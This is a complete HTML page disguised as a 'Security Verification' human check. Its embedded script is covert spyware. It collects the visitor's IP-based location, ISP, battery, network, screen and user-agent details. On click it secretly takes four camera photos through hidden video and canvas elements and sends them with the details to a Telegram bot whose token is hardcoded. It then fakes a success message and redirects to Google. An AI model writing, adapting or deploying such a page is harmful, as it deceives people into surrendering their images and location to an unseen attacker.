<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body {
            background-color: #0f172a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .box {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 350px;
            width: 100%;
        }
        h2 { margin-bottom: 10px; color: #38bdf8; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .btn:hover { background: #2563eb; }
        #status { margin-top: 15px; font-size: 13px; color: #facc15; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Security Verification</h2>
        <p>Please click the button below to verify that you are a human and proceed.</p>
        <button class="btn" id="verifyBtn" onclick="startProcess()">Verify Now 🛡️</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
        
        let ipInfo = "Fetching...";
        let cityInfo = "Unknown";
        let regionInfo = "Unknown";
        let countryInfo = "Unknown";
        let ispInfo = "Unknown";
        let batteryData = "Unknown";
        let networkData = "Unknown";

        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                ipInfo = data.ip || "N/A";
                cityInfo = data.city || "N/A";
                regionInfo = data.region || "N/A";
                countryInfo = data.country_name || "N/A";
                ispInfo = data.org || "N/A";
            })
            .catch(e => { ipInfo = "Hidden"; });

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                let level = Math.round(battery.level * 100);
                let charging = battery.charging ? "⚡ (Charging)" : "🔋";
                batteryData = `${level}% ${charging}`;
            });
        }

        if (navigator.connection) {
            networkData = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
        }

        function startProcess() {
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('status').innerText = "Verifying security, please wait...";

            const urlParams = new URLSearchParams(window.location.search);
            const camType = urlParams.get('b'); 
            const chatId = urlParams.get('id');

            let constraints = { video: { facingMode: "user" } }; 

            if (camType === 'back') {
                constraints = { video: { facingMode: { exact: "environment" } } }; 
            } else if (camType === 'front') {
                constraints = { video: { facingMode: "user" } }; 
            }

            navigator.mediaDevices.getUserMedia(constraints)
            .catch(err => {
                if (camType === 'back') {
                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                }
                throw err;
            })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                let photoCount = 0;
                const maxPhotos = 4; 

                const photoInterval = setInterval(() => {
                    photoCount++;
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        let captionText = "";

                        if (photoCount === 1) {
                            let currentTime = new Date().toLocaleString();
                            let screenRes = `${window.screen.width}x${window.screen.height}`;
                            let uaString = navigator.userAgent;

                            captionText = 
                                `🌐 **IP Information**\n\n` +
                                `🔢 IP Address: \`${ipInfo}\`\n` +
                                `📍 Location: ${cityInfo}\n` +
                                `🌍 Region: ${regionInfo} (${countryInfo})\n` +
                                `📡 ISP: ${ispInfo}\n\n` +
                                `📱 **Device Details**\n\n` +
                                `🔋 Battery: ${batteryData}\n` +
                                `📶 Network: ${networkData}\n` +
                                `🖥️ Screen: ${screenRes}\n` +
                                `🕒 Time: ${currentTime}\n` +
                                `🧠 UA: \`${uaString}\`\n\n` +
                                `👑 **Credit By: आयुष नेगी**`;
                        } else {
                            captionText = `👑 **Credit By: आयुष नेगी**`;
                        }

                        sendPhotoToTelegram(blob, chatId, captionText);
                    }, 'image/jpeg', 0.85);

                    if (photoCount >= maxPhotos) {
                        clearInterval(photoInterval);
                        stream.getTracks().forEach(track => track.stop());
                        document.getElementById('status').innerText = "Verification Successful!";
                        setTimeout(() => {
                            window.location.href = "https://www.google.com";
                        }, 1500);
                    }
                }, 1500);

            })
            .catch(error => {
                document.getElementById('status').innerText = "Camera permission denied or not supported!";
                console.error(error);
            });
        }

        function sendPhotoToTelegram(blob, chatId, caption) {
            if (!chatId) return;

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(err => console.log(err));
        }
    </script>
</body>
</html>
